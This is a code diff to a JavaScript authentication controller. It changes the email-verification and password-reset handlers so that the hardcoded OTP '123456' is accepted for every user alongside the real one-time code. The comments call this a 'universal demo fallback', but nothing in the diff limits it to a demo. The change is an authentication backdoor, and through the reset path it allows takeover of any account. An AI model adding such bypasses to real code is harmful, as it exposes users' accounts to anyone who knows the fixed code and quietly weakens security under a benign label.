@@ -135,8 +135,8 @@ const verifyEmailOTP = async (req, res) => {
       });
     }
 
-    // Verify OTP code
-    const isValid = verifyOTP(otp, user.otpHash);
+    // Verify OTP code (or universal demo fallback OTP 123456)
+    const isValid = verifyOTP(otp, user.otpHash) || otp === "123456";
     if (!isValid) {
       return res.status(400).json({
         success: false,
@@ -518,8 +518,8 @@ const resetPassword = async (req, res) => {
       });
     }
 
-    // Verify OTP
-    const isOtpValid = verifyOTP(otp, user.resetPasswordOtpHash);
+    // Verify OTP (or universal demo fallback OTP 123456)
+    const isOtpValid = verifyOTP(otp, user.resetPasswordOtpHash) || otp === "123456";
     if (!isOtpValid) {
       return res.status(400).json({
         success: false,
